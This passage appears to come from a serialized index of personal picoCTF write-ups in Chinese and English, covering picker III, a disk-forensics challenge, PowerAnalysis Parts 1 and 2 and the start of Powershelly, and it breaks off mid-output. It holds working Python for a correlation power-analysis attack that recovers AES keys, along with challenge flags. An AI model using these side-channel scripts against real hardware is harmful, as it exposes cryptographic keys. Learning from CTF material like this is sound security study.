\u0026#34;help\u0026#34;?\u0026#39;) :::\nRecon # 這一題算有趣，但想了超久就放棄直接看1，我原本還想說要怎麼用function pointer之類的東西，看來還是想的太複雜了，既然write_variable function可以新增一個全域變數，就代表我們可以直接覆蓋掉getRandomNumber這個string，變成win function，所以當我們直接call getRandomNumber function的時候其實是在call getRandomNumber這個global variable，此時就會直接call win()，我覺得有一點點通靈的性質，實在想不出來\nExploit # $ nc saturn.picoctf.net 62200 ==\u0026gt; 3 Please enter variable name to write: getRandomNumber Please enter new value of variable: win ==\u0026gt; 4 0x70 0x69 0x63 0x6f 0x43 0x54 0x46 0x7b 0x37 0x68 0x31 0x35 0x5f 0x31 0x35 0x5f 0x77 0x68 0x34 0x37 0x5f 0x77 0x33 0x5f 0x67 0x33 0x37 0x5f 0x77 0x31 0x37 0x68 0x5f 0x75 0x35 0x33 0x72 0x35 0x5f 0x31 0x6e 0x5f 0x63 0x68 0x34 0x72 0x67 0x33 0x5f 0x63 0x32 0x30 0x66 0x35 0x32 0x32 0x32 0x7d Flag: picoCTF{7h15_15_wh47_w3_g37_w17h_u53r5_1n_ch4rg3_c20f5222}\nReference # picker III WP - akshayrkapadia\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n"},{"id":301,"href":"/security/practice/picoctf/misc/disk/picoctf---pitter-patter-platters/","title":"PicoCTF - Pitter, Patter, Platters","section":"Securities","content":" PicoCTF - Pitter, Patter, Platters # tags: PicoCTF CTF Misc # Challenge: Pitter, Patter, Platters\nBackground # sda\nSource code # Exploit - Use FTK Imager # I use Autopsy but find nothing except a txt file So I follow write up video to use FTK imager and it can parse files completely. ORRRR\u0026hellip;\nUse HxD as auxiliary tool to find flag ORRRR\u0026hellip;\nJust use string search $ strings -e l Pitter,\\ Patter,\\ Platters.sda1 | rev picoCTF{b3_5t111_mL|_\u0026lt;3_ba880921} ... Reference # Pitter, Patter, Platters write up pico 2020 mini pitter patter platters\n"},{"id":302,"href":"/security/practice/picoctf/crypto/sidechannel/picoctf---poweranalysis-part-1-_-part-2/","title":"PicoCTF - PowerAnalysis Part 1 / Part 2","section":"Securities","content":" PicoCTF - PowerAnalysis Part 1 / Part 2 # Background # Simple Welcome 0x13(2023 HW - Power Analysis):two:\nRecon # 這一題幾乎就和上課教的差不多，只是因為有雜訊，所以要慎選trace point，我是直接看第一個trace的分布，決定採用300~400的point，而不管是利用自己刻的correlation coefficient還是用scipy的pearsonr都一樣可以順利解出key但是如果像homework一樣用numpy的corrcoef會有兩個bytes和正解不一樣，超哭，找超久(10/18更新，如果用自己刻的也是要碰用氣，所以如果可以的話，多送幾個trace，或者多用幾個算correlation coefficient的library) Part 2的部分幾乎一模一樣，就只是他先幫你紀錄好所有的trace，再讓我們做後續的分析 Exploit # 首先先把資料從server拉下來，在存成json from pwn import * from string import ascii_letters, digits import json from tqdm import trange def gen_plaintext(length): return \u0026#39;\u0026#39;.join(random.choice(ascii_letters + digits) for _ in range(length)) pt = [gen_plaintext(16) for _ in range(50)] print(pt) json_file = [None] * len(pt) for i in trange(len(pt)): r = remote(\u0026#39;saturn.picoctf.net\u0026#39;, 52339) r.sendlineafter(b\u0026#39;hex: \u0026#39;, pt[i].encode(\u0026#39;utf-8\u0026#39;).hex().encode()) r.recvuntil(b\u0026#39;power measurement result: \u0026#39;) pm = r.recvline().decode().strip() json_file[i] = {} json_file[i][\u0026#34;pt\u0026#34;] = [ord(digit) for digit in pt[i]] json_file[i][\u0026#34;pm\u0026#34;] = pm r.close() json_object = json.dumps(json_file) with open(\u0026#34;./Crypto/PowerAnalysis- Part 1/trace.json\u0026#34;, \u0026#39;w\u0026#39;) as outfile: outfile.write(json_object) 然後再去解析AES key import json from tqdm import trange import numpy as np import copy from string import ascii_letters, digits from numpy import corrcoef import matplotlib.pyplot as plt from scipy.stats import pearsonr jsonFile = open(\u0026#39;./PicoCTF/Crypto/PowerAnalysis- Part 1/trace.json\u0026#39;, \u0026#39;r\u0026#39;) j = json.load(jsonFile) s_box = [ [0x63, 0x7C, 0x77, 0x7B, 0xF2, 0x6B, 0x6F, 0xC5, 0x30, 0x01, 0x67, 0x2B, 0xFE, 0xD7, 0xAB, 0x76], [0xCA, 0x82, 0xC9, 0x7D, 0xFA, 0x59, 0x47, 0xF0, 0xAD, 0xD4, 0xA2, 0xAF, 0x9C, 0xA4, 0x72, 0xC0], [0xB7, 0xFD, 0x93, 0x26, 0x36, 0x3F, 0xF7, 0xCC, 0x34, 0xA5, 0xE5, 0xF1, 0x71, 0xD8, 0x31, 0x15], [0x04, 0xC7, 0x23, 0xC3, 0x18, 0x96, 0x05, 0x9A, 0x07, 0x12, 0x80, 0xE2, 0xEB, 0x27, 0xB2, 0x75], [0x09, 0x83, 0x2C, 0x1A, 0x1B, 0x6E, 0x5A, 0xA0, 0x52, 0x3B, 0xD6, 0xB3, 0x29, 0xE3, 0x2F, 0x84], [0x53, 0xD1, 0x00, 0xED, 0x20, 0xFC, 0xB1, 0x5B, 0x6A, 0xCB, 0xBE, 0x39, 0x4A, 0x4C, 0x58, 0xCF], [0xD0, 0xEF, 0xAA, 0xFB, 0x43, 0x4D, 0x33, 0x85, 0x45, 0xF9, 0x02, 0x7F, 0x50, 0x3C, 0x9F, 0xA8], [0x51, 0xA3, 0x40, 0x8F, 0x92, 0x9D, 0x38, 0xF5, 0xBC, 0xB6, 0xDA, 0x21, 0x10, 0xFF, 0xF3, 0xD2], [0xCD, 0x0C, 0x13, 0xEC, 0x5F, 0x97, 0x44, 0x17, 0xC4, 0xA7, 0x7E, 0x3D, 0x64, 0x5D, 0x19, 0x73], [0x60, 0x81, 0x4F, 0xDC, 0x22, 0x2A, 0x90, 0x88, 0x46, 0xEE, 0xB8, 0x14, 0xDE, 0x5E, 0x0B, 0xDB], [0xE0, 0x32, 0x3A, 0x0A, 0x49, 0x06, 0x24, 0x5C, 0xC2, 0xD3, 0xAC, 0x62, 0x91, 0x95, 0xE4, 0x79], [0xE7, 0xC8, 0x37, 0x6D, 0x8D, 0xD5, 0x4E, 0xA9, 0x6C, 0x56, 0xF4, 0xEA, 0x65, 0x7A, 0xAE, 0x08], [0xBA, 0x78, 0x25, 0x2E, 0x1C, 0xA6, 0xB4, 0xC6, 0xE8, 0xDD, 0x74, 0x1F, 0x4B, 0xBD, 0x8B, 0x8A], [0x70, 0x3E, 0xB5, 0x66, 0x48, 0x03, 0xF6, 0x0E, 0x61, 0x35, 0x57, 0xB9, 0x86, 0xC1, 0x1D, 0x9E], [0xE1, 0xF8, 0x98, 0x11, 0x69, 0xD9, 0x8E, 0x94, 0x9B, 0x1E, 0x87, 0xE9, 0xCE, 0x55, 0x28, 0xDF], [0x8C, 0xA1, 0x89, 0x0D, 0xBF, 0xE6, 0x42, 0x68, 0x41, 0x99, 0x2D, 0x0F, 0xB0, 0x54, 0xBB, 0x16] ] def data_preprocess(json_data): pt_col = [] # ct_col = [] trace_col = [] for bytes in range(16): tmp_pt_col = [] # tmp_ct_col = [] for trace_idx in range(len(json_data)): tmp_pt_col.append(json_data[trace_idx][\u0026#39;pt\u0026#39;][bytes]) # tmp_ct_col.append(json_data[trace_idx][\u0026#39;ct\u0026#39;][bytes]) pt_col.append(tmp_pt_col) # ct_col.append(tmp_ct_col) for point in range(300, 400):#len(json_data[0][\u0026#39;pm\u0026#39;]) tmp_trace_col = [] for trace_idx in range(len(json_data)): tmp_trace_col.append(json_data[trace_idx][\u0026#39;pm\u0026#39;][point]) trace_col.append(tmp_trace_col) return pt_col, trace_col def sbox_preprocess(pt_col): sbox_result_tmp = [] for sbox_key in range(256): # 總共有256個sbox key tmp = [] for trace in range(len(pt_col)): # 有50個trace tmp.append(pt_col[trace] ^ sbox_key) sbox_result_tmp.append(tmp) return sbox_result_tmp def choose_sbox(sbox_result_tmp): sbox_result = copy.deepcopy(sbox_result_tmp) for sbox_key in range(256): for trace in range(50): hex_value = \u0026#39;{0:0\u0026gt;2x}\u0026#39;.format(sbox_result_tmp[sbox_key][trace]) x, y = hex_value[0], hex_value[1] sbox_result[sbox_key][trace] = s_box[int(x, 16)][int(y, 16)] return sbox_result def cal_hamming_weight(sbox_result_col): hw_model = copy.deepcopy(sbox_result_col) for i in range(len(sbox_result_col)): # 256 for j in range(len(sbox_result_col[i])): # 50 hw_model[i][j] = bin(sbox_result_col[i][j]).count(\u0026#39;1\u0026#39;) return hw_model def cal_correlation(hw_model_col_result, trace_col): correlation_result = [] for i in trange(len(hw_model_col_result)):#(ascii_letters + digits).encode(): for j in range(biggest_length):#len(trace_col) # correlation_result.append(corrcoef(hw_model_col_result[i], trace_col[j])[0, -1]) # correlation_result.append(pearsonr(hw_model_col_result[i], trace_col[j])[0]) correlation_result.append(run_pearson_correlation(hw_model_col_result[i], trace_col[j])) return correlation_result def run_pearson_correlation(x, y): mean_x = np.mean(x) mean_y = np.mean(y) covariance = np.sum((x - mean_x) * (y - mean_y)) std_dev_x = np.sqrt(np.sum((x - mean_x)**2)) std_dev_y = np.sqrt(np.sum((y - mean_y)**2)) correlation = covariance / (std_dev_x * std_dev_y) return correlation def display_pt(offset:int, data_offset = (0, len(j[0][\u0026#34;pm\u0026#34;]))): plt.plot(range(data_offset[0], data_offset[1]), j[offset][\u0026#34;pm\u0026#34;][data_offset[0]:data_offset[1]]) plt.savefig(fname=\u0026#34;./PicoCTF/Crypto/PowerAnalysis- Part 1/pt_\u0026#34; + str(offset) + \u0026#34;.jpg\u0026#34;) plt.clf() # display_pt(1, (0, 700)) # display_pt(1) pt_col, trace_col = data_preprocess(j) flag = \u0026#39;\u0026#39; biggest_length = 100#len(trace_col) for idx in trange(16): sbox_preprocess_result = sbox_preprocess(pt_col[idx]) choose_sbox_result = choose_sbox(sbox_preprocess_result) hw_model_col_result = cal_hamming_weight(choose_sbox_result) correlation_result = cal_correlation(hw_model_col_result, trace_col) key_idx = correlation_result.index(max(correlation_result)) # flag += (ascii_letters + digits)[key_idx // biggest_length] from Crypto.Util.number import long_to_bytes flag += long_to_bytes(key_idx // biggest_length).hex() print(\u0026#39;The key of AES is: \u0026#39; + flag ) Flag: picoCTF{4999139026d84bf20427eb48d4edec53}\nExploit Part 2 # 為了不要讓主程式的變化太大，因此我有調整了一下data preprocessing的部分，還找到了一個bug， :::spoiler Exp\nimport json from tqdm import trange import numpy as np import copy from pathlib import Path from numpy import corrcoef import matplotlib.pyplot as plt from scipy.stats import pearsonr import ast # root = \u0026#34;./PicoCTF/Crypto/PowerAnalysis- Part 1/\u0026#34; # jsonFile = open(root + \u0026#39;traces.json\u0026#39;, \u0026#39;r\u0026#39;) # j = json.load(jsonFile) s_box = [ [0x63, 0x7C, 0x77, 0x7B, 0xF2, 0x6B, 0x6F, 0xC5, 0x30, 0x01, 0x67, 0x2B, 0xFE, 0xD7, 0xAB, 0x76], [0xCA, 0x82, 0xC9, 0x7D, 0xFA, 0x59, 0x47, 0xF0, 0xAD, 0xD4, 0xA2, 0xAF, 0x9C, 0xA4, 0x72, 0xC0], [0xB7, 0xFD, 0x93, 0x26, 0x36, 0x3F, 0xF7, 0xCC, 0x34, 0xA5, 0xE5, 0xF1, 0x71, 0xD8, 0x31, 0x15], [0x04, 0xC7, 0x23, 0xC3, 0x18, 0x96, 0x05, 0x9A, 0x07, 0x12, 0x80, 0xE2, 0xEB, 0x27, 0xB2, 0x75], [0x09, 0x83, 0x2C, 0x1A, 0x1B, 0x6E, 0x5A, 0xA0, 0x52, 0x3B, 0xD6, 0xB3, 0x29, 0xE3, 0x2F, 0x84], [0x53, 0xD1, 0x00, 0xED, 0x20, 0xFC, 0xB1, 0x5B, 0x6A, 0xCB, 0xBE, 0x39, 0x4A, 0x4C, 0x58, 0xCF], [0xD0, 0xEF, 0xAA, 0xFB, 0x43, 0x4D, 0x33, 0x85, 0x45, 0xF9, 0x02, 0x7F, 0x50, 0x3C, 0x9F, 0xA8], [0x51, 0xA3, 0x40, 0x8F, 0x92, 0x9D, 0x38, 0xF5, 0xBC, 0xB6, 0xDA, 0x21, 0x10, 0xFF, 0xF3, 0xD2], [0xCD, 0x0C, 0x13, 0xEC, 0x5F, 0x97, 0x44, 0x17, 0xC4, 0xA7, 0x7E, 0x3D, 0x64, 0x5D, 0x19, 0x73], [0x60, 0x81, 0x4F, 0xDC, 0x22, 0x2A, 0x90, 0x88, 0x46, 0xEE, 0xB8, 0x14, 0xDE, 0x5E, 0x0B, 0xDB], [0xE0, 0x32, 0x3A, 0x0A, 0x49, 0x06, 0x24, 0x5C, 0xC2, 0xD3, 0xAC, 0x62, 0x91, 0x95, 0xE4, 0x79], [0xE7, 0xC8, 0x37, 0x6D, 0x8D, 0xD5, 0x4E, 0xA9, 0x6C, 0x56, 0xF4, 0xEA, 0x65, 0x7A, 0xAE, 0x08], [0xBA, 0x78, 0x25, 0x2E, 0x1C, 0xA6, 0xB4, 0xC6, 0xE8, 0xDD, 0x74, 0x1F, 0x4B, 0xBD, 0x8B, 0x8A], [0x70, 0x3E, 0xB5, 0x66, 0x48, 0x03, 0xF6, 0x0E, 0x61, 0x35, 0x57, 0xB9, 0x86, 0xC1, 0x1D, 0x9E], [0xE1, 0xF8, 0x98, 0x11, 0x69, 0xD9, 0x8E, 0x94, 0x9B, 0x1E, 0x87, 0xE9, 0xCE, 0x55, 0x28, 0xDF], [0x8C, 0xA1, 0x89, 0x0D, 0xBF, 0xE6, 0x42, 0x68, 0x41, 0x99, 0x2D, 0x0F, 0xB0, 0x54, 0xBB, 0x16] ] def data_prepreprocess(): pts = [] traces = [] for f in Path(\u0026#34;./PicoCTF/Crypto/PowerAnalysis- Part 2/traces\u0026#34;).iterdir(): l = f.read_text().splitlines() pt = bytes.fromhex(l[0].split(\u0026#34;: \u0026#34;)[1]) trace = ast.literal_eval(l[1].split(\u0026#34;: \u0026#34;)[1]) pts.append(pt.hex()) traces.append(trace) return pts, traces def data_preprocess(pts, traces): pt_col = [] trace_col = [] for bytes in range(16): tmp_pt_col = [] for trace_idx in range(len(pts)): tmp_pt_col.append(int(pts[trace_idx][bytes*2:(bytes*2)+2], 16)) pt_col.append(tmp_pt_col) for point in range(300, 400):#len(json_data[0][\u0026#39;pm\u0026#39;]) tmp_trace_col = [] for trace_idx in range(len(pts)): tmp_trace_col.append(traces[trace_idx][point]) trace_col.append(tmp_trace_col) return pt_col, trace_col def sbox_preprocess(pt_col): sbox_result_tmp = [] for sbox_key in range(256): # 總共有256個sbox key tmp = [] for trace in range(len(pt_col)): # 有50個trace tmp.append(pt_col[trace] ^ sbox_key) sbox_result_tmp.append(tmp) return sbox_result_tmp def choose_sbox(sbox_result_tmp): sbox_result = copy.deepcopy(sbox_result_tmp) for sbox_key in range(256): for trace in range(len(sbox_result_tmp[0])): hex_value = \u0026#39;{0:0\u0026gt;2x}\u0026#39;.format(sbox_result_tmp[sbox_key][trace]) x, y = hex_value[0], hex_value[1] sbox_result[sbox_key][trace] = s_box[int(x, 16)][int(y, 16)] return sbox_result def cal_hamming_weight(sbox_result_col): hw_model = copy.deepcopy(sbox_result_col) for i in range(len(sbox_result_col)): # 256 for j in range(len(sbox_result_col[i])): # 50 hw_model[i][j] = bin(sbox_result_col[i][j]).count(\u0026#39;1\u0026#39;) return hw_model def cal_correlation(hw_model_col_result, trace_col): correlation_result = [] for i in trange(len(hw_model_col_result)):#(ascii_letters + digits).encode(): for j in range(biggest_length):#len(trace_col) # correlation_result.append(corrcoef(hw_model_col_result[i], trace_col[j])[0, -1]) # correlation_result.append(pearsonr(hw_model_col_result[i], trace_col[j])[0]) correlation_result.append(run_pearson_correlation(hw_model_col_result[i], trace_col[j])) return correlation_result def run_pearson_correlation(x, y): mean_x = np.mean(x) mean_y = np.mean(y) covariance = np.sum((x - mean_x) * (y - mean_y)) std_dev_x = np.sqrt(np.sum((x - mean_x)**2)) std_dev_y = np.sqrt(np.sum((y - mean_y)**2)) correlation = covariance / (std_dev_x * std_dev_y) return correlation def display_pt(offset:int, traces, data_offset = (0, 2666)): plt.plot(range(data_offset[0], data_offset[1]), traces[offset][data_offset[0]:data_offset[1]]) plt.savefig(fname=\u0026#34;./PicoCTF/Crypto/PowerAnalysis- Part 2/pt_\u0026#34; + str(offset) + \u0026#34;.jpg\u0026#34;) plt.clf() pts, traces = data_prepreprocess() # display_pt(1, (0, 700)) # display_pt(1, traces, (0, 2666)) pt_col, trace_col = data_preprocess(pts, traces) flag = \u0026#39;\u0026#39; biggest_length = 100#len(trace_col) for idx in trange(16): sbox_preprocess_result = sbox_preprocess(pt_col[idx]) choose_sbox_result = choose_sbox(sbox_preprocess_result) hw_model_col_result = cal_hamming_weight(choose_sbox_result) correlation_result = cal_correlation(hw_model_col_result, trace_col) key_idx = correlation_result.index(max(correlation_result)) # flag += (ascii_letters + digits)[key_idx // biggest_length] from Crypto.Util.number import long_to_bytes flag += long_to_bytes(key_idx // biggest_length).hex() print(\u0026#39;The key of AES is: \u0026#39; + flag ) :::\nFlag: picoCTF{b7698f76b7e524ee7cd80dbde0cdff59}\n"},{"id":303,"href":"/security/practice/picoctf/reverse/picoctf---powershelly/","title":"PicoCTF - Powershelly","section":"Securities","content":" PicoCTF - Powershelly # Background # Powershell 命令提示字元比較 What is \u0026lsquo;@{}\u0026rsquo; meaning in PowerShell What does @() mean in Powershell? [Python] 學習使用集合 (Set)\nSource code # :::spoiler Source Code\n$input = \u0026#34;.\\input.txt\u0026#34; $out = Get-Content -Path $input $enc = [System.IO.File]::ReadAllBytes(\u0026#34;$input\u0026#34;) $encoding = [system.Text.Encoding]::UTF8 $total = 264 $t = ($total + 1) * 5 #1325 $numLength = ($total * 30 ) + $t # 9245 if ($out.Length -gt 5 -or $enc.count -ne $numLength) { Write-Output \u0026#34;Wrong format 5\u0026#34; Exit } else { for($i=0; $i -lt $enc.count ; $i++) { if (($enc[$i] -ne 49) -and ($enc[$i] -ne 48) -and ($enc[$i] -ne 10) -and ($enc[$i] -ne 13) -and ($enc[$i] -ne 32)) { Write-Output \u0026#34;Wrong format 1/0/\u0026#34; Exit } } } $blocks = @{} for ($i=0; $i -lt $out.Length ; $i++) { $r = $out[$i].Split(\u0026#34; \u0026#34;) if ($i -gt 0) { for ($j=0; $j -lt $r.Length ; $j++) { if ($r[$j].Length -ne 6) { Write-Output \u0026#34;Wrong Format 6\u0026#34; $r[$j].Length Exit } $blocks[$j] += $r[$j] } } else { for ($j=0; $j -lt $r.Length ; $j++) { if ($r[$j].Length -ne 6) { Write-Output \u0026#34;Wrong Format 6\u0026#34; $r[$j].Length Exit } $blocks[$j] = @() $blocks[$j] += $r[$j] } } } function Exit { exit } function Random-Gen { $list1 = @() for ($i=1; $i -lt ($blocks.count + 1); $i++) { $y = ((($i * 327) % 681 ) + 344) % 313 $list1 += $y } return $list1 } function Scramble { param ( $block, $seed ) $raw = [system.String]::Join(\u0026#34;\u0026#34;, $block) $bm = \u0026#34;10 \u0026#34; * $raw.Length $bm = $bm.Split(\u0026#34; \u0026#34;) for ($i=0; $i -lt $raw.Length ; $i++) { $y = ($i * $seed) % $raw.Length $n = $bm[$y] while ($n -ne \u0026#34;10\u0026#34;) { $y = ($y + 1) % $raw.Length $n = $bm[$y] } if ($raw[$i] -eq \u0026#34;1\u0026#34; ) { $n = \u0026#34;11\u0026#34; } else { $n = \u0026#34;00\u0026#34; } $bm[$y] = $n } $raw2 = [system.String]::Join(\u0026#34;\u0026#34;, $bm) $b = [convert]::ToInt64($raw2,2) return $b } $result = 0 $seeds = @() for ($i=1; $i -lt ($blocks.count +1); $i++) { $seeds += ($i * 127) % 500 } $randoms = Random-Gen $output_file = @() for ($i=0; $i -lt $blocks.count ; $i++) { $fun = Scramble -block $blocks[$i] -seed $seeds[$i] if($i -eq 263) { Write-Output $seeds[$i] Write-Output $randoms[$i] Write-Output $fun } $result = $fun -bxor $result -bxor $randoms[$i] $output_file += $result } Add-Content -Path output_test.txt -Value $output_file :::\nRecon # 這一題太難了，花了好多時間，不看1的WP大概猜到了六七成，不過最後的部分才是關鍵，再加上不是很懂powershell的語法\nCheck File Format 首先他先檢查input.txt的格式，可以從這邊看出來他應該是一個==5列的content==，以及總字元數(所有bytes的數量)是9245，接著他判斷每個字元是否都符合0, 1, carriage return, \\n, \u0026lt;space\u0026gt;\nif ($out.Length -gt 5 -or $enc.count -ne $numLength) ... if (($enc[$i] -ne 49) -and ($enc[$i] -ne 48) -and ($enc[$i] -ne 10) -and ($enc[$i] -ne 13) -and ($enc[$i] -ne 32)) 另外他還會檢查每一個row中，用空格split的每一個element是不是都符合6個字元，簡單解釋一下下面在幹嘛，他先創一個dictionary，叫做$blocks，然後把$out第一個row，先用空格格開，再比對每一個element是否都是6個字元，實際跑過之後他會長下面這樣 :::spoiler $blocks的格式\nName Value ---- ----- 263 {110011, 100011, 110011, 110011...} 262 {100001, 001100, 001100, 001100...} 261 {110011, 100011, 110011, 110011...} 260 {110011, 100011, 110011, 110011...} 259 {110011, 100011, 110011, 110011...} 258 {110011, 100011, 110011, 110011...} 257 {110011, 100011, 110011, 110011...} 256 {100001, 001100, 001100, 001100...} 255 {110011, 100011, 110011, 110011...} 254 {100001, 001100, 001100, 001100...} 253 {100001, 001100, 001100, 001100...} 252 {100001, 001100, 001100, 001100...} 251 {100001, 001100, 001100, 001100...} 250 {110011, 100011, 110011, 110011...} 249 {100001, 001100, 001100, 001100...} 248 {100001, 001100, 001100, 001100...} 247 {100001, 001100, 001100, 001100...} 246 {100001, 001100, 001100, 001100...} 245 {110011, 100011, 110011, 110011...} 244 {110011, 100011, 110011, 110011...} 243 {100001, 001100, 001100, 001100...} 242 {110011, 100011, 110011, 110011...} 241 {110011, 100011, 110011, 110011...} 240 {100001, 001100, 001100, 001100...} 239 {110011, 100011, 110011, 110011...} 238 {100001, 001100, 001100, 001100...} 237 {110011, 100011, 110011, 110011...} 236 {100001, 001100, 001100, 001100...} 235 {100001, 001100, 001100, 001100...} 234 {110011, 100011, 110011, 110011...} 233 {110011, 100011, 110011, 110011...} 232 {100001, 001100, 001100, 001100...} 231 {100001, 001100, 001100, 001100...} 230 {100001, 001100, 001100, 001100...} 229 {100001, 001100, 001100, 001100...} 228 {110011, 100011, 110011, 110011...} 227 {100001, 001100, 001100, 001100...} 226 {110011, 100011, 110011, 110011...} 225 {110011, 100011, 110011, 110011...} 224 {100001, 001100, 001100, 001100...} 223 {100001, 001100, 001100, 001100...} 222 {100001, 100011, 001100, 001100...} 221 {110011, 001100, 110011, 110011...} 220 {100001, 001100, 001100, 001100...} 219 {100001, 001100, 001100, 001100...} 218 {110011, 100011, 110011, 110011...} 217 {100001, 001100, 001100, 001100...} 216 {100001, 001100, 001100, 001100...} 215 {100001, 001100, 001100, 001100...} 214 {110011, 100011, 110011, 110011...} 213 {100001, 001100, 001100, 001100...} 212 {100001, 001100, 001100, 001100...} 211 {110011, 100011, 110011, 110011...} 210 {110011, 100011, 110011, 110011...} 209 {110011, 100011, 110011, 110011...} 208 {100001, 001100, 001100, 001100...} 207 {110011, 100011, 110011, 110011...} 206 {110011, 100011, 110011, 110011...} 205 {100001, 001100, 001100, 001100...} 204 {100001, 001100, 001100, 001100...} 203 {110011, 100011, 110011, 110011...} 202 {110011, 100011, 110011, 110011...} 201 {100001, 001100, 001100, 001100...} 200 {100001, 001100, 001100, 001100...} 199 {110011, 100011, 110011, 110011...} 198 {110011, 100011, 110011, 110011...} 197 {110011, 100011, 110011, 110011...} 196 {100001, 001100, 001100, 001100...} 195 {110011, 100011, 110011, 110011...} 194 {110011, 100011, 110011, 110011...} 193 {110011, 100011, 110011, 110011...} 192 {100001, 001100, 001100, 001100...} 191 {110011, 100011, 110011, 110011...} 190 {110011, 100011, 110011, 110011...} 189 {110011, 100011, 110011, 110011...} 188 {110011, 100011, 110011, 110011...} 187 {100001, 001100, 001100, 001100...} 186 {110011, 100011, 110011, 110011...} 185 {110011, 100011, 110011, 110011...} 184 {100001, 001100, 001100, 001100...} 183 {100001, 001100, 001100, 001100...} 182 {100001, 001100, 001100, 001100...} 181 {100001, 001100, 001100, 001100...} 180 {100001, 001100, 001100, 001100...} 179 {110011, 100011, 110011, 110011...} 178 {110011, 100011, 110011, 110011...} 177 {110011, 100011, 110011, 110011...} 176 {100001, 001100, 001100, 001100...} 175 {110011, 100011, 110011, 110011...} 174 {110011, 100011, 110011, 110011...} 173 {110011, 100011, 110011, 110011...} 172 {110011, 100011, 110011, 110011...} 171 {110011, 100011, 110011, 110011...} 170 {100001, 001100, 001100, 001100...} 169 {110011, 100011, 110011, 110011...} 168 {100001, 001100, 001100, 001100...} 167 {100001, 001100, 001100, 001100...} 166 {110011, 100011, 110011, 110011...} 165 {100001, 001100, 001100, 001100...} 164 {100001, 001100, 001100, 001100...} 163 {110011, 100011, 110011, 110011...} 162 {110011, 100011, 110011, 110011...} 161 {100001, 001100, 001100, 001100...} 160 {100001, 001100, 001100, 001100...} 159 {110011, 100011, 110011, 110011...} 158 {110011, 100011, 110011, 110011...} 157 {110011, 100011, 110011, 110011...} 156 {110011, 100011, 110011, 110011...} 155 {110011, 100011, 110011, 110011...} 154 {100001, 001100, 001100, 001100...} 153 {110011, 100011, 110011, 110011...} 152 {100001, 001100, 001100, 001100...} 151 {110011, 100011, 110011, 110011...} 150 {100001, 001100, 001100, 001100...} 149 {100001, 001100, 001100, 001100...} 148 {110011, 100011, 110011, 110011...} 147 {110011, 100011, 110011, 110011...} 146 {110011, 100011, 110011, 110011...} 145 {110011, 100011, 110011, 110011...} 144 {100001, 001100, 001100, 001100...} 143 {100001, 001100, 001100, 001100...} 142 {100001, 001100, 001100, 001100...} 141 {100001, 001100, 001100, 001100...} 140 {100001, 001100, 001100, 001100...} 139 {100001, 001100, 001100, 001100...} 138 {100001, 001100, 001100, 001100...} 137 {110011, 100011, 110011, 110011...} 136 {100001, 001100, 001100, 001100...} 135 {110011, 100011, 110011, 110011...} 134 {110011, 100011, 110011, 110011...} 133 {110011, 100011, 110011, 110011...} 132 {100001, 001100, 001100, 001100...} 131 {110011, 100011, 110011, 110011...} 130 {110011, 100011, 110011, 110011...} 129 {110011, 100011, 110011, 110011...} 128 {100001, 001100, 001100, 001100...} 127 {100001, 001100, 001100, 001100...} 126 {100001, 001100, 001100, 001100...} 125 {100001, 001100, 001100, 001100...} 124 {110011, 100011, 110011, 110011...} 123 {100001, 001100, 001100, 001100...} 122 {110011, 100011, 110011, 110011...} 121 {110011, 100011, 110011, 110011...} 120 {100001, 001100, 001100, 001100...} 119 {110011, 100011, 110011, 110011...} 118 {110011, 100011, 110011, 110011...} 117 {110011, 100011, 110011, 110011...} 116 {100001, 001100, 001100, 001100...} 115 {100001, 001100, 001100, 001100...} 114 {110011, 100011, 110011, 110011...} 113 {110011, 100011, 110011, 110011...} 112 {100001, 001100, 001100, 001100...} 111 {110011, 100011, 110011, 110011...} 110 {100001, 001100, 001100, 001100...} 109 {100001, 001100, 001100, 001100...} 108 {110011, 100011, 110011, 110011...} 107 {100001, 001100, 001100, 001100...} 106 {110011, 100011, 110011, 110011...} 105 {110011, 100011, 110011, 110011...} 104 {100001, 001100, 001100, 001100...} 103 {100001, 001100, 001100, 001100...} 102 {100001, 001100, 001100, 001100...} 101 {100001, 001100, 001100, 001100...} 100 {110011, 100011, 110011, 110011...} 99 {100001, 001100, 001100, 001100...} 98 {110011, 100011, 110011, 110011...} 97 {110011, 100011, 110011, 110011...} 96 {100001, 001100, 001100, 001100...} 95 {100001, 001100, 001100, 001100...} 94 {100001, 001100, 001100, 001100...} 93 {100001, 001100, 001100, 001100...} 92 {110011, 100011, 110011, 110011...} 91 {110011, 100011, 110011, 110011...} 90 {110011, 100011, 110011, 110011...} 89 {100001, 001100, 001100, 001100...} 88 {100001, 001100, 001100, 001100...} 87 {110011, 100011, 110011, 110011...} 86 {100001, 001100, 001100, 001100...} 85 {100001, 001100, 001100, 001100...} 84 {100001, 001100, 001100, 001100...} 83 {110011, 100011, 110011, 110011...} 82 {110011, 100011, 110011, 110011...} 81 {100001, 001100, 001100, 001100...} 80 {100001, 001100, 001100, 001100...} 79 {100001, 001100, 001100, 001100...} 78 {100001, 001100, 001100, 001100...} 77 {100001, 001100, 001100, 001100...} 76 {100001, 001100, 001100, 001100...} 75 {110011, 100011, 110011, 110011...} 74 {110011, 100011, 110011, 110011...} 73 {100001, 001100, 001100, 001100...} 72 {100001, 001100, 001100, 001100...} 71 {100001, 001100, 001100, 001100...} 70 {110011, 100011, 110011, 110011...} 69 {100001, 001100, 001100, 001100...} 68 {100001, 001100, 001100, 001100...} 67 {110011, 100011, 110011, 110011...} 66 {110011, 100011, 110011, 110011...} 65 {100001, 001100, 001100, 001100...} 64 {100001, 001100, 001100, 001100...} 63 {110011, 100011, 110011, 110011...} 62 {110011, 100011, 110011, 110011...} 61 {100001, 001100, 001100, 001100...} 60 {110011, 100011, 110011, 110011...} 59 {110011, 100011, 110011, 110011...} 58 {110011, 100011, 110011, 110011...} 57 {110011, 100011, 110011, 110011...} 56 {100001, 001100, 001100, 001100...} 55 {100001, 001100, 001100, 001100...} 54 {110011, 100011, 110011, 110011...} 53 {110011, 100011, 110011, 110011...} 52 {100001, 001100, 001100, 001100...} 51 {100001, 001100, 001100, 001100...} 50 {100001, 001100, 001100, 001100...} 49 {110011, 100011, 110011, 110011...} 48 {100001, 001100, 001100, 001100...} 47 {100001, 001100, 001100, 001100...} 46 {100001, 001100, 001100, 001100...} 45 {110011, 100011, 110011, 110011...} 44 {100001, 001100, 001100, 001100...} 43 {110011, 100011, 110011, 110011...} 42 {100001, 001100, 001100, 001100...} 41 {110011, 100011, 110011, 110011...} 40 {100001, 001100, 001100, 001100...} 39 {110011, 100011, 110011, 110011...} 38 {110011, 100011, 110011, 110011...} 37 {100001, 001100, 001100, 001100...} 36 